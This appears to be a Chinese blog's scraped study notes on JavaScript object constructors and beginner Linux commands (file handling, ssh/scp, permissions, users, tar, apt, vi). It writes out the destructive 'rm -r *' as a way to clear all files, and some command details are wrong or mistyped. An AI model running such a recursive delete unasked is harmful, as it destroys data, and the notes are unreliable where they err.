使用工厂方法创建对象1234567891011121314151617181920212223242526272829303132333435&#x2F;* 创建一个对象 *&#x2F; &#x2F;* var obj &#x3D; &#123; name:&quot;孙悟空&quot;, age:18, gender:&quot;男&quot;, sayName:function()&#123; alert(this.name); &#125; &#125;; *&#x2F; &#x2F;* 使用工厂方法创建对象 *&#x2F; function createPerson(name,age,gender)&#123; &#x2F;&#x2F; 创建一个新的对象 var obj &#x3D;new Object(); &#x2F;&#x2F; 向对象中添加属性 obj.name&#x3D;name; obj.age&#x3D;age; obj.gender&#x3D;gender; obj.sayName&#x3D;function()&#123; alert(this.name); &#125;; &#x2F;&#x2F; 将新的对象返回 return obj; &#125; var obj2 &#x3D; createPerson(&quot;猪八戒&quot;,16,&quot;男&quot;); var obj3 &#x3D; createPerson(&quot;玉兔精&quot;,22,&quot;女&quot;); var obj4 &#x3D; createPerson(&quot;唐僧&quot;,25,&quot;男&quot;); obj3.sayName(); 构造函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&#x2F;* 创建一个构造函数，专门用来创建Person对象的 构造函数就是一个普通的函数，创建方式和普通函数没有区别 不同的是，构造函数习惯上首字母大写 构造函数和普通函数的区别就是调用方式的不同 普通函数就是直接调用，而构造函数需要使用new关键字来调用 构造函数执行流程 1、立刻创建一个新的对象 2、将新建的对象设置为函数中的this,在构造函数中可以使用this来引用新建的对象 3、逐行执行函数中的代码 4、将新建的对象作为返回值返回 使用同一个构造函数创建的对象，我们称为一类对象 我们将通过一个构造函数创建的对象，称为是该类的实例 this的情况 1、当以函数的形式调用时，this是window 2、当以方法的形式调用时，谁调用方法this就是谁 3、当以构造函数的形式调用时，this就是新创建的那个对象 *&#x2F; function Person(name,age)&#123; this.name &#x3D; name; this.age &#x3D; age; this.sayName &#x3D; function()&#123; alert(this.name); &#125;; &#125; var per &#x3D; new Person(&quot;孙悟空&quot;,18); var per2 &#x3D; new Person(&quot;猪八戒&quot;,20); &#x2F;* console.log(per); console.log(per2); *&#x2F; &#x2F;* 使用instanceof可以检查一个对象是否是一个类的实例 语法: 对象 instanceof 构造函数 如果是返回true，否则返回false *&#x2F; &#x2F;* 所有的对象都是Object的后代， 所以任何对象和Object做instanceof检查时都会返回true *&#x2F; console.log(per instanceof Person); &#x2F;* 用来创建狗的对象 *&#x2F; &#x2F;* function createDog(name,age)&#123; var obj &#x3D; new Object(); obj.name &#x3D; name; obj.age &#x3D; age; obj.sayHello &#x3D; function()&#123; alert(&quot;汪汪~~~&quot;); &#125;; return obj; &#125; *&#x2F; &#x2F;* 使用工厂方法创建的对象，使用的构造函数都是Object 所以创建的对象都是Object这个类型 就导致我们无法区分出多种不同类型的对象 *&#x2F; &#x2F;&#x2F; var dog &#x3D; createDog(&quot;大福&quot;,3); &#x2F;&#x2F; dog.sayHello();","categories":[],"tags":[]},{"title":"linux笔记 ","slug":"linux笔记 ","date":"2020-04-03T06:32:04.233Z","updated":"2020-04-03T06:31:30.000Z","comments":true,"path":"2020/04/03/linux笔记 /","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/03/linux%E7%AC%94%E8%AE%B0%20/","excerpt":"","text":"常用 Linux 命令的基本使用目标 理解学习 Linux 终端命令的原因 常用 Linux 命令体验 01. 学习 Linux 终端命令的原因 Linux 刚面世时并没有图形界面，所有的操作全靠命令完成，如 磁盘操作、文件存取、目录操作、进程管理、文件权限 设定等 在职场中，大量的 服务器维护工作 都是在 远程 通过 SSH 客户端 来完成的，并没有图形界面，所有的维护工作都需要通过命令来完成 在职场中，作为后端程序员，必须要或多或少的掌握一些 Linux 常用的终端命令 Linux 发行版本的命令大概有 200 多个，但是常用的命令只有 10 多个而已 学习终端命令的技巧： 不需要死记硬背，对于常用命令，用的多了，自然就记住了 不要尝试一次学会所有的命令，有些命令是非常不常用的，临时遇到，临时百度就可以 02. 常用 Linux 命令的基本使用 序号 命令 对应英文 作用 01 ls list 查看当前文件夹下的内容 02 pwd print wrok directory 查看当前所在文件夹 03 cd [目录名] change directory 切换文件夹 04 touch [文件名] touch 如果文件不存在，新建文件 05 mkdir [目录名] make directory 创建目录 06 rm [文件名] remove 删除指定的文件名 07 clear clear 清屏 小技巧 ctrl + shift + = 放大终端窗口的字体显示 ctrl + - 缩小终端窗口的字体显示 03. 自动补全 在敲出文件目录命令的前几个字母之后，按下 tab 键 如果输入的没有歧义，系统会自动补全 如果还存在其他 文件／目录／命令，再按一下 tab 键，系统会提示可能存在的命令 小技巧 按 上／下 光标键可以在曾经使用过的命令之间来回切换 如果想要退出选择，并且不想执行当前选中的命令，可以按 ctrl + c Linux 终端命令格式目标 了解终端命令格式 知道如何查阅终端命令帮助信息 01. 终端命令格式1command [-options] [parameter] 说明： command：命令名，相应功能的英文单词或单词的缩写 [-options]：选项，可用来对命令进行控制，也可以省略 parameter：传给命令的参数，可以是 零个、一个 或者 多个 [] 代表可选 02. 查阅命令帮助信息（知道） 提示 现阶段只需要 知道 通过以下两种方式可以查询命令的帮助信息 先学习常用命令及常用选项的使用即可，工作中如果遇到问题可以借助 网络搜索 2.1 --help1command --help 说明： 显示 command 命令的帮助信息 2.2 man1man command 说明： 查阅 command 命令的使用手册 man 是 manual 的缩写，是 Linux 提供的一个 手册，包含了绝大部分的命令、函数的详细使用说明 使用 man 时的操作键： 操作键 功能 空格键 显示手册页的下一屏 Enter 键 一次滚动手册页的一行 b 回滚一屏 f 前滚一屏 q 退出 /word 搜索 word 字符串 3.1 touch命令 如果文件不存在，可以创建一个文件 如果文件已经存在 可以修改文件的末次日期。 3.2mkdir 创建一个新的目录 选项 含义 -p 可以递归创建目录 意思可以在目录中连续创建多个目录 新建目录名称和文件是不可以重名的。 如果使用同名文件夹会报错显示已存在文件。 ~/目录 可以进入想要进入的家目录。 3.4 rmrm 只能删除文件 ， rm后加-r可以删除文件或者目录。 *rm删除文件或者目录后是不可以恢复的，因为rm命令是直接从磁盘中删除。所以使用rm命令时需要谨慎使用避免删错。 * 使用rm时看好在那个目录下，防止删除系统内容，导致系统瘫痪。 选项 含义 -f 强制删除文件，如果文件不存在是不提示错误的。 ** **-f只能删除文件，是不可以强制删除目录的 -r 可以删除目录中所有内容，删除目录时必须加-r 通配符也可以在rm中使用，rm -r * 可以清除所有文件和目录。 0.4 拷贝和移动文件4.1tree 序号 命令 作用 01 tree[目录名] tree命令是以树状图列出目录结构 02 cp 源文件 目标文件 复制文件或者目录 03 mv 源文件 目标文件 移动文件或者目录/文件或者目录重名 tree 加~ 可以显示家目录下所有文件和目录。 tree 加-d 只显示目录。 directories 表示目录 files 表示文件 4.2 cp 选项 含义 -i 覆盖文件时候提示是否覆盖 -r 复制文件时在cp后面加-r 复制完成的文件会把源文件下所有子目录和文件复制过去 ，但目标文件需要重命名。 4.3 mvmv命令可以用来移动文件或者目录，也可以给文件或者目录重命名。 mv命令后加-i 可以提示是否覆盖文件或者目录以防发生覆盖错误。 使用mv命令时如果加入-i 出现存在文件会提示我们是否覆盖，这样在使用的时候会更加安全。因为文件或目录覆盖和删除后时没办法恢复的。 05 查看文件内容、 命令 作用 cat 文件名 查看文件内容、创建文件、文件合并、追加文件内容等功能 more 文件名 分屏显示文件内容 grep 搜索内容文件名 搜索文本文件内容 5.1 catcat 查看文件内容、创建文件、文件合并、追加文件内容等功能 cat 会一次显示所有的内容，适合 查看内容较少的文本文件 选项 含义 -b 对非空输出行编号 将空开的行不给予行号 -n 对输出的所有行编号 将所有行都给予行号 Linux 中还有一个nl的命令和cat -b 的效果等价 5.2 moremore命令可以用于分屏显示文件内容，每次只显示一页内容 适合查看内容较多的文本文件 操作键 功能 空格键 显示手册页的下一屏 回车键 一次滚动手册页的一行 b 回滚一屏 f 前滚一屏 q 退出 /word 搜索 word字符串 空格键和F键功能是一样的。 5.3 grepLinux 系统中 grep 命令是一种强大的文本搜索工具 grep 允许对文本文件进行 模式查找，所谓模式查找，又被称为正则表达式， 选项 含义 -n 显示匹配行及行号 既显示内容又显示行号 -v 显示不包含匹配文本的所有行（相当于取反搜索） 省略你想要搜索的内容 -i 忽略大小写 grep 可以查找文本中你想要找到的内容 grep -vn 将-n和-v 合并 显示行号但不显示你所查找的内容 grep -i 的时候 如果搜索内容中间有空格需要用引号将你所要搜索的内容引起来。 常用的两种模式查找 参数 含义 ^a 行首，搜索以a开头的行 ke$ 行尾，搜索以ke结束的行 ^(你所要找的行首内容) (你所要找的行尾内容)$ 0.6其他6.1 echo 文字内容echo 会在终端中显示参数指定的文字，通常会和 重定向 联合使用 ceho 是将你想要显示指定文字在显示一边 echo 很少会单独使用 6.2重定向 &gt; 和 &gt;&gt;Linux 允许将命令执行结果 重定向 到一个文件 将本应显示在终端上的内容输出 / 追加到指定文件中 · &gt; 表示输出，会覆盖你源文件的全部内容。 · &gt;&gt;表示追加，会将内容追加到已有文件的末尾. 使用 &gt; 时 要谨慎使用，防止将重要文件覆盖。 在你想要使用 &gt; &gt;&gt; 等命令后面加上文件名 6.3 管道|Linux 允许将 一个命令的输出 可以 通过管道 做为 另一个命令的输入 这里|可以理解为管子，左端塞东西（写），右端去东西（读） 常用管道命令： more：分屏显示内容 grep：在命令执行结果的基础上查询指定的文本。 远程管理常用命令目标 关机/重启 shutdown 查看或配置网卡信息 ifconfig ping 远程登陆和复制文件 ssh scp 01.关机/重启 命令 作用 shutdown 选项 时间 关机/重新启动 想要重新启动电脑或者关闭电脑可以在终端中先输入shutdown 在指令选项（关机/重启）并接上一个关机/重新启动的时间 如果向立即关闭 电脑 只需要在 shutdown 关机/重启电脑 now 只需要在时间那里输入一个now。 如果 不指令任何选项，默认的将会是关机， 选项 含义 -r 重新启动 如果想要重启电脑，只需要加入一个 -r 的指令。 提示： 如果不指定时间参数，系统默认一分钟之后关闭电脑 如果后悔 在shutdown 后面加-c 表示取消关机 而这个操作需要在一分钟之内完成，也就是关机之前完成操作。 远程维护服务器时，最好不好关闭系统，而应该重新启动系统 我们在输入 shutdown 指令时千万不要忘记输入 -r 指令 如果忘记输入-r 立刻加 -c 取消关机 常用命令示例 1234567891011121314# 重新启动操作系统，其中 now 表示现在立即$ shutdown -r now# 立即关机，其中 now 表示现在$ shutdown now# 系统在今天的20：25会关机$ shutdown 20:25# 系统在过十分钟自动关机$ shutdown +10# 取消之前指定的关机计划$ shutdown -c 02.查看或配置网卡信息 命令 作用 ifconfig 查看/配置计算机当前的网卡配置信息 ping ip地址 检测到目标 ip地址的链接是否正常 2.1 网卡和IP地址网卡 网卡是一个专门负责网络通讯的硬件设备 IP地址是设置在网卡上的地址信息 我们可以把电脑比作电话，网卡相当于SIM卡，ip地址相当于电话号码 ip地址 每台联网的电脑上都有ip地址，是帮正电脑之间正常通讯的重要设置 注意：每台电脑的ip地址不能相同，否则会出现ip冲突，并且没有办法正常通讯。 2.2 ifconfigifconfig 可以查看/配置计算机当前的网卡配置信息 12345# 查看网卡配置信息$ ifconfig# 查看网卡对应的Ip地址$ ifconfig | grep inet inet 地址 是IP地址，如果内容太多只想显示ip地址命令，可以利用管道命令来显示。 提示：一台计算机中有可能会有一个 物理网卡 和 多个虚拟网卡， 在Linux 中物理网卡的名字通常以 ensXX 表示 127.0.0.1 被称为 本地回环/环回地址，一般用来测试本机网卡是否正常 2.3 ping12345# 检测到目标主机是否连接正常$ ping IP地址# 检测本地网卡工作正常$ ping 127.0.0.1 ping 一般用于检测当前计算机到目标计算机之间的网络 是否通畅， 数值越大 ， 速度越慢 。 要使用 ping命令，必须要知道目标主机的 IP地址 意思是，目标主机无法到达。也就是说 当前ip地址和我们计算机并没有网络连接。 如果使用 ping 127.0.0.1 有回馈就说明我们本地网卡是通的。 3.1 ssh 基础 （重点内容）在Linux 中 SSH 是非常常用 的工具，通过 SSH客户端 我们可以连接到运行了SSH服务器 的远程机器上 SSH是个软件不管是客户端还是服务器 工作方式：当两个软件安装到位之后，我们就可以在自己的电脑上通过网络远程登录到服务器上，对服务器进行日常管理和维护。 在Ubuntu中SSH是默认安装的 只有在windows系统下需要专门安装客户端进行远程维护。 SSH是目前较可靠， 专为远程登录会话和其他网络服务 提供安全性的协议 利用SSH协议 可以有效防止远程管理过程中的信息泄露 通过SSH协议 可以对所有传输的数据进行加密，也能够防止DNS欺骗和 IP 欺骗 SSH 的另一项优点是传输的数据可以是经过压缩的，所以也可以加快传输的速度 1）域名 和 端口号域名 由一串 用点分隔 的名字组成，例如：www.itcast.cn 是IP地址的别名，方便用户记忆 端口号 IP地址：通过 IP地址 找到网络上的 计算机 端口号：通过 端口号 可以找到 计算机上运行的应用程序 ip 地址：端口号 这两个命令一个不能少 每个服务器都有默认的端口，如果我们在访问服务器的时候没有指定端口，那它用的则是默认端口。 SSH服务器的默认端口是22，如果是默认端口号，再连接的时候，可以省略 常见的服务器端口号列表： 服务 端口号 SSH服务器 22 Web服务器 80 HTTPS 443 FTP服务器 21 2）SSH 客户端的简单使用12ssh [-p port] user@remote如果 你所用的port 就是默认端口号 前面的-p可以省略，如果不是则需要加上-p 跟上指定端口号。 user 是在远程机器上的用户名，如果不指定的话默认为当前用户 remote 是远程机器的地址，可以是 ip/域名，或者是 别名 port 是SSH Server 监听的端口，如果不指定，就为默认值22 提示： 使用exit 退出当前用户的登录 注意： ssh 这个终端命令 只能在linux 或者 unix 系统下使用 如果在Windows系统中，可以安装PuTTY或者 XShell 客户端软件即可 提示： 在工作中，SSH服务器的端口号很有可能 不是22，如果遇到这种情况就需要使用 -p 选项，指定正确的端口号，否侧无法正常连接到服务器。 3）Windows下SSH客户端的安装 3.2 scp （掌握） scp是一个在Linux下用来进行 远程拷贝文件 的命令 它的 地址格式与 ssh 基本相同 ，需要注意的是，在指定端口时用的是大写的 -P而不是小写的。 可以将我们的文件拷贝到服务器里，也可以将服务器里的文件拷贝到我们的客户端 123456# 把本地当前目录下的11245.txt文件 复制到 远程 家目录下的 文档&#x2F;11245.txt# 注意：“：”后面的路径如果不是绝对路径，则以用户的家目录做为参照路径scp -P port 1124.txt user@remote：桌面&#x2F;11245.txt#把远程 家目录下的 桌面&#x2F;1124.txt 文件 复制到 本地当前目录下的 11245.txtscp -P pore user@remote:桌面&#x2F;11245.txt 11245.txt 选项 含义 -r 如给出的源文件是目录文件，则scp将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名 -p 若远程SSH服务器的端口不是22，需要使用大写字母-P选项指定端口 SSH 高级 （知道）SSH配置信息都保存在用户家目录下的 .ssh 目录下 免密码登录 scp -p 22 用户名/ip cat known_hosts(记录第一次连接主机的授权码)ls 配置公钥 执行 ssh-keygen即可生成SSH钥匙，一路回车即可 上传公钥到服务器 执行 ssh-copy-id -p 用户名@ip ，可以让远程服务器记住我们的公钥 公钥和私钥 进行免密码登录首先执行ssh-keygen这个命令，这个命令可以生成两个文件，一个带点的一个 id_rsa.pub 一个不带点的id_rsa 而带点的文件我们称他为公钥，而不带点的文件我们称他为私钥。 所谓公钥就是公共加密的钥匙，而私钥就是私用加密的钥匙 使用公钥加密的钥匙，我们必须要用私钥进行解密，而反过来呢，使用私钥加密的钥匙，我们必须要用公钥解密 2)配置别名每次输入 ssh -p port user@remote, 时间久了会觉得很麻烦，特别是当 ueer 和port都得输入，还不好记忆。 而配置别名可以让我们进一步偷懒，譬如 ssh mac 来代替上面这么一长串，那么就 在~/.ssh/config 里面追加以下内容： Host mac HostName ip 地址 User itheima port 22 保存之后即可用 ssh mac 实现远程登录了，scp同样可以使用 用户和权限的基本概念1.1 基本概念用户是Linux 系统工作中重要的一环，用户管理包括 用户 与 组 管理 在Linux系统中，不论是由本机或是远程登陆系统，每个系统都必须拥有一个账号并且对于不同的系统资源拥有不同的使用权限 在Linux中，可以指定 每一个用户 针对 不用的文件或者目录 的 不同权限 对 文件/目录 的而权限包括： 权限 英文 缩写 数字代号 读 read r 4 写 write w 2 执行 excute x 1 1.3 ls -l扩展r 表示可读的意思 w 表示可写的意思 x 表示可执行的意思 1.4 chmod 简单使用（重要）chmod 可以修改 用户/组 对 文件/目录 的权限 命令格式如下： 1chmod +&#x2F;-rwx 文件名|目录名 gedit 打开文件 可以进行编写。 1.5 超级用户 0.2 组管理终端命令创建 组/删除组 的终端命令都需要 sudo 执行 ch表示修改 grp 表示组 -R 文件 目录名 提示： 组信息保存在/etc/group 文件中 /etc 目录是专门用来保存 系统配置信息 的目录 0.3 创建用户/设置密码/删除用户add 表示添加的意思 命令 作用 说明 useradd -m -g 组名 新建用户名 添加新用户 -m 自动建立用户家目录-g用户所在的组 passwd 用户名 设置用户密码 如果是普通用户，直接用passwd可以修改自己的账户密码 userdel -r 用户名 删除用户 -r 选项会自动删除用户家目录 cat /etc/passwd | grep 用户名 确认用户信息 新建用户后，用户信息会保存在/etc/passwd文件中 3.2 查看用户信息 命令 作用 id [用户名] 查看用户UID和GID信息 who 查看当前所有登录的用户列表 whoami 查看当前登录用户的账户名 passwd 文件 /etc/passwd 文件存放的是用户的信息，由6个分号组成的7个信息，分别是： 1.用户名 2.密码（x，表示加密的密码） 3.UID（用户标识） 4.GID（组标识） 5.用户全名或者本地账号 6.家目录 7.登录使用的Shell，就是登录之后，使用的只能终端命令，Ubuntu默认是dash 在passwd中是以冒号来分组信息的每一个冒号分隔一个信息 介绍： 一开始 表示当前用户名，第二个 x 表示这个用户是有密码的，但是密码是加密的，第三个1001表示用户名的代号，后面的1001表示lisi这个用户所归属的组的代号，：：这一列是空的表示lisi用户的全名，如果没有设置就用用户名做为lisi的全名 /home/lisi 表示用户所在的家目录 usermod usermod -g 组 用户名 修改的是主组 usermod -G 组 用户名 修改的是附加组 which（重要）/etc/passwd 用于保存用户信息的文件 /usr/bin/passwd 用于修改用户密码的程序 which 命令可以查询我们能执行终端命令所在位置。 3.3 切换用户 命令 作用 说明 su - 用户名 切换用户，并且切换目录 - 可以切换到用户家目录，否则保持位置不变 exit 退出当前登录账户 su 不接用户名，可以切换到root身份，root对系统所有资源都有管理权限，不推荐使用，因为不安全。 0.4 修改文件权限 命令 作用 chown 修改拥有者 chgrp 修改组 chmod 修改权限 12345678# 修改文件 | 目录拥有者chown 用户名 文件名 | 目录名 # 递归修改文件|目录的组chgrp -R 组名 文件名|目录名#递归修改文件权限chmod -R 755 文件名|目录名 chmod 在设置权限时，可以简单地使用三个数字分别对应 7表示拥有者的意思第二个5表示组的意思 和 第三个5表示其他用户的权限 1# chmod+&#x2F;-rwx 可以直接修改文件|目录的 读|写|执行 权限，但是不能精确到 拥有者|组|其他 系统信息相关命令学习目标 通过远程终端维护服务器时，查看服务器上当前 系统日期和时间/磁盘空间占用情况/程序执行情况 本小结学习的终端命令进本都是查询命令，通过这些命令对系统资源的使用情况有个了解 目标 时间和日期 date cal 磁盘和目录空间 df du 进程信息 ps top kill 01.时间和日期 命令 作用 date 查看系统时间 cal calendar 查看日历，-y选项可以查看一年的日历 02.磁盘信息 命令 作用 df -h 显示磁盘剩余空间 du -h [目录名] 显示目录下的文件大小 选项说明 参数 含义 -h 以人性化的方式显示文件大小 03.进程信息 所谓进程，通俗的说就是 当前正在执行的一个程序 命令 作用 ps aux process status查看进程的详细状况 top 动态显示运行中的进程并且排序 kill[-9] 进程代号 终止指定代号的进程，-9 表示强行终止 ps 默认智慧显示当前用户通过终端启动的应用程序 ps 选项说明功能 PID ** 表示 **进程代号 user 表示 当前用户身份 选项 含义 a 显示终端上的所有进程，包括其他用户的进程 u 显示进程的详细状态 x 显示没有控制终端的进程 kill -9 进程代号 中的 -9 表示强行终止，而-9通常用在 单纯用kill无法结束的进程 就可以加一个 -9， 提示：使用kill命令时，最好只终止当前用户开启的进程，而不要终止root身份开启的进程，否则可能导致系统崩溃 要退出top可以直接输入q kill命令使用时，先用ps查询进程代号，再用kill结束想要结束的进程。 其他命令命令 查找文件 find 软连接 ln 打包和压缩 tar 软件安装 apt-get 01.查找文件 find命令功能非常强大，通常用来在 特定的目录下 搜索 符合条件的文件 命令 作用 find[路径] -name “*搜索条件” 查找指定路径下的文件，包括子目录 如果省略路径，表示在当前文件夹下查找 之前的通配符，在使用find命令时也可以使用 演练目标 1.搜索桌面目录下，文件名包含 1 的文件 1find [桌面&#x2F;] -name “*1*” 搜索桌面目录下，所有以 .txt 为扩展名的文件 1find [桌面&#x2F;] -name &quot;*.txt&quot; 3.搜索桌面目录下，以数字1开头的文件 1find [桌面&#x2F;] -name &quot;1*&quot; 如果省略路径，是搜索当前路径下的全部文件和目录 02.软连接 命令 作用 ln -s 被链接的源文件链接文件 建立文件的软链接，用通俗的方式讲类似于Windows下的 快捷方式 注意： 1.没有 -s 选项建立的是一个 硬链接文件 -s选项是不能省略的 两个文件占用相同大小的硬盘空间，工作中几乎不会建立文件的硬链接 2源文件要使用绝对路径，不能使用相对路径，这样可以方便移动链接文件后，仍然能够正常使用 硬链接（知道） 在使用ln 创建链接时，如果没有-s 选项 ，会创建一个硬链接，而不是软连接 03.打包压缩 打包压缩 是日常工作中备份文件的一种方式 在不同操作系统中，常用的打包压缩方式是不同的 在Windows 常用 rar mac 常用 zip Linux 常用 tar.gz 3.1打包/压缩 tar 是linux中最常用的备份 工具，此命令可以 把一系列文件 打包到 一个大文件中，也可以把一个 打包的大文件恢复成一系列文件 tar命令格式 如下： 12345# 打包文件tar -cvf 打包文件.tar 被打包文件&#x2F;路径...#解包文件tar -xvf 打包文件.tar tar 选项说明 选项 含义 c 生成档案文件，创建打包文件 x 揭开档案文件 v 列出归档解档的详细过程，显示进度 f 指定档案文件名称，f后面一定是.tar文件,所以必须放选项最后 注意：f选项必须放在最后，其他选项顺序随意。 tar 只负责打包不负责压缩 3.2压缩/解压缩1）gzip tar与gzip命令结合可以是实现文件 打包和压缩 tar 只负责打包文件，但不压缩 用gzip压缩tar打包后的文件，其扩展名一般用xxx.tar.gz 在linux中，最常见的压缩文件格式就是xxx.tar.gz 在tar 命令中有一个选项 -z 可以调用gzip ，从而可以方便的实现压缩和解压缩的功能 命令格式如下： 12345678# 压缩文件tar -zcvf 打包文件.tar.gz 被压缩的文件&#x2F;路径...# 解压缩文件tar -zxvf 打包文件.tar.gz# 解压缩到指定路径tar -zxvf 打包文件.tar.gz -C 目标路径 选项 含义 -C 解压缩到指定目录，注意：要解压缩的目录必须存在 如果不存在解压缩无法完成。 2）bzip2（two） tar与bzip2 命令结合可以使用实现文件打包和压缩（用法和gzip一样） tar 只负责打包文件，但不压缩 用bzip2 压缩 tar 打包后的文件，其扩展名一般用xxx.tar.bz2 在 tar 命令中有一个选项 -j 可以调用 bzip2，从未可以方便的实现压缩和及压缩的功能 命令格式如下： 12345# 压缩文件tar -jcvf 打包文件.tar.bz2 被压缩的文件&#x2F;路径..#解压缩文件tar -jxvf 打包文件.tar.bz2 想要用gzip 时候 加 -z 想要用bzip2 加 -j 04.软件安装4.1.通过apt 安装/卸载软件 apt 是Advanced Packaging Tool,是Linux下的一款安装包管理工具 可以在终端中方便的 安装/卸载/更新软件包 12345678# 1.安装软件$ sudo apt install 软件包# 2.卸载软件$ sudo apt remove 软件名# 3.更新已安装的包$ sudo apt upgrade 要使用 apt 必须要用 sudo 用 root 身份执行 安装演练 12# 一个小火车提示$ sudo apt install sl 12# 一个比较漂亮的查看当前进程排名的软件$ sudo apt install htop 4.2配置软件源 如果希望Ubuntu 中安装软件，更加快速，可以通过设置镜像源，选择一个访问网速更快的服务器来提供软件下载/安装服务 提示：更换服务器之后，需要一个相对不较长时间的更新过程，需要耐心等待。更新完成后，在安装软件都会从新设置的服务器下载软件了 软件源概念： Ubuntu提供有一个主服务器，主服务器有所有软件的安装包，我们就会吧这个主服务器叫做软件源，所谓软件源，就是提供所有软件安装包的源头。 镜像源概念： 所谓镜像源，就是所有服务器的内容是相同的（镜像），但是根据所在位置不同，国内服务器通常速度会更快一些！ vi——终端中的编辑器目标 vi简介 打开和新建文件 三种工作模式 常用命令 分屏命令 常用命令速查图 01.vi简介1.1学习 vi 的目的 在工作中，要对 服务器 上的文件进行 简单 的修改，可以使用ssh远程登录到服务器上，并且使用vi进行快速的编辑即可 常见需要修改的文件包括： 源程序 配置文件，例如ssh的配置文件~/.ssh/config 在没有图形界面的环境下，要编辑文件，vi是最佳选择 每一个要使用Linux的程序员，都应该或多或少学习一些vi的常用命令 1.2vi 和 vim vi的特点 没有图形界面 的 功能强大 的编辑器 只能是编辑 文本内容， 不能对字体、段落进行排版 不只吃鼠标操作 没有菜单 只有命令 vi 编辑器在 系统管理、服务器管理 编辑文件时，其功能永远不是图形界面的编辑器能比拟的 02.打开和新建文件 在终端中输入vi 在后面跟上文件名 即可 1# vi 文件名 如果文件已经存在，会直接打开文件 如果文件不存在，会新建一个文件 2.1 打开文件并且定位行用 vi 打开已有内容的文件后，按 i 进行编辑模式 在日常工作中，有可能会遇到 打开一个文件，并定位到指定行 的情况 例如：在开发时，知道某一行代码有错，可以 快速定位 到出错代码的位置 这个时候，可以使用以下命令打开 12# vi 文件名 +行数如果只带上+而不指定行数，或直接定位在末尾 2.2异常处理 如果vi异常退出，再吃攀上可能会保存有交换问及那 下次在使用vi编辑该文件是，会看到一下屏幕信息，按下字母d可以删除交换文件即可 提示：按下键盘是之一关闭输入法 末行模式命令 命令 功能 w 保存 q 退出，如果没有保存，不允许退出 q！ 强行退出，不保存退出 wq 保存并退出 x 保存并退出 04.vi 常用命令4.1移动（基本）1）上、下、左、右 命令 功能 h 向左 j 向下 k 向上 l 向右 2）行内移动 命令 功能 w 向后移动一个单词 b 向前移动一个单词 0 行首 ^ 行首，第一个不是空白符的位置 $ 行尾 3）行数移动 命令 功能 gg 文件顶部 G 文件末尾 数字gg 移动到 数字 对应行数 数字G 移动到 数字 对应行数 ：数字 移动到数字对应行数 4）屏幕移动 命令 功能 Ctrl+b 向上翻页 Ctrl+f 向下翻页 H 屏幕顶部 M 屏幕中间 L 屏幕底部 4.2移动（程序）1）段落移动 在vi中使用 空行 来区分段落 在程序开发是，通常 一段功能相关的代码会写在一起 —— 之间没有空行 命令 功能 { 上一段 } 下一段 2）括号切换 在程序世界中，{}、[]、() 使用频率很高，而且 都是成对出现的 命令 功能 % 括号匹配及切换 3）标记 在开发时，某一块代码可能 需要稍后处理，例如：编辑、查看 此时先使用 m 增加一个标记，这样可以 在需要时快速的跳转回来 或者 执行其他编辑操作 标记名称 可以是 a~z 之间的任意 一个 字母 添加了标记的 行如果被删除，标记同时被删除 如果 在其他行添加了相同名称的标记，之前添加的标记也会被替换掉 命令 功能 mx 添加标记x，x是az 或者AZ之间的任意一个字母 ‘x 直接定位到标记x所在位置 选中文本（可视模式） 学习复制命令前，应该先学会 怎样选中 要复制的代码 在 vi 中 要选择文本，需要先使用 visual 命令切换到 可视模式 vi 中提供了 三种 可是模式，可以方便程序员选择 选中文本的方式 按ESC 可以放弃选中，返回 命令模式 命令 模式 功能 v 可视模式 从光标位置开始按照正常模式选择文本 V 可视行模式 选中光标经过的完整行 Ctrl + v 可是块模式 垂直方向选中文本 可视模式下 ，可以和 移动命令 连用， 例如：ggVG 能够选中所有内容 4.4撤销和恢复撤销 在学 编辑命令 之前，先要知道怎样撤销之前一次 错误的 编辑动作~ 命令 英文 功能 u undo 撤销上次命令 Ctrl+r redo 恢复撤销的命令 4.5删除文本 命令 英文 功能 x cut 删除光标所在字符，胡总和选中文字 d（移动命令） delete 删除移动命令对应的内容 dd delete 删除光标所在行，可以 ndd 复制多行 D delete 删除至行尾 提示：如果使用 可视模式 已经选中了一段文本，那么无论使用 d 还是 x，都可以删除选中文本 删除命令可以和 移动命令 连用，一下常见的组合命令： 12345* d0 # 从光标位置删除到一行的起始位置* d&#125; # 从光标位置删除到段落的结尾* ndd # 从光标位置向下连续删除 n 行* d代码行G # 从光标所在行 删除到 指定代码行 之间的所有代码* d&#39;a # 从光标所在行 产出到 标记a 之间的所有代码 4.6 复制、粘贴 vi 中提供有一个 被复制文本的缓冲区 复制 命令会将选中的文字保存在缓冲区 删除 命令删除的文字会被保存在缓冲区 再所需的位置，使用 粘贴 命令可以将缓冲区的文字插入到光标所在位置 命令 英文 功能 y（移动命令） copy 复制 yy copy 复制一行，可以nyy复制多行 p paste 粘贴 注意 命令 d、x 本质是剪切命令，但被放入文本缓冲区，如果有其他复制或者剪贴命令，之前的剪切内容将被替换。 也就是说 vi 中没有删除命令，只有剪贴命令，而剪切命令也被认为是删除命令 vi中的 文本缓冲区 和 系统的剪贴板 不是同一个 所以在其他软件中使用 Ctrl+C 复制的内容跟，不能再 vi 中通过 P 命令粘贴 可以在 编辑模式 下使用 鼠标右键粘贴 4.7 替换 命令 英文 功能 工作模式 r replace 替换当前字符 命令模式 R replace 替换当前光标所在位置向后替换 替换模式 R 命令可以进入 替换模式 ， 替换完成后，按下ESC 可以回到 命令模式 替换命令 的作用就是不用进入 编辑模式，对文件进行 轻量级的修改 对文件修改幅度非常小可以用替换命令，否则就要使用 编辑模式 再用ESC退出，效率太慢 4.8 缩排和重复执行 命令 功能 &gt;&gt; 向右增加缩进 &lt;&lt; 想做减少缩进 . 重复上次命令 缩排命令 在开发程序时，通一增加代码的缩进 比较有用！ 一次性 在选中代码前增加4个空格，就叫做 增加缩进 一次性 在选中代码前删除4个空格，就叫做减少缩进 在 可视模式 下，缩排命令需要使用一个 &gt; 或这 &lt; 在程序中，缩进 通常用来表示代码的归属关系 缩进对于程序开发非常重要 前面空格越少，代码的级别越高 前面空格越多，代码的级别越低 4.9 查找常规查找 命令 功能 /str（内容） 查找 str 查找到指定内容之后，使用 Next 查找下一个出现的位置： n：查找下一个出现的位置 N：查找上一个出现的位置 如果不想看到的高亮显示，可以随便查找一个文件中不存在的内容即可 单词快速匹配 命令 功能 ***** 向后查找当前目标虽在单词 # 向前查找当前光标所在单词 在开发中，通过单词快速匹配，可以快速看到这个单词在其他什么位置使用过 4.10 查找并替换 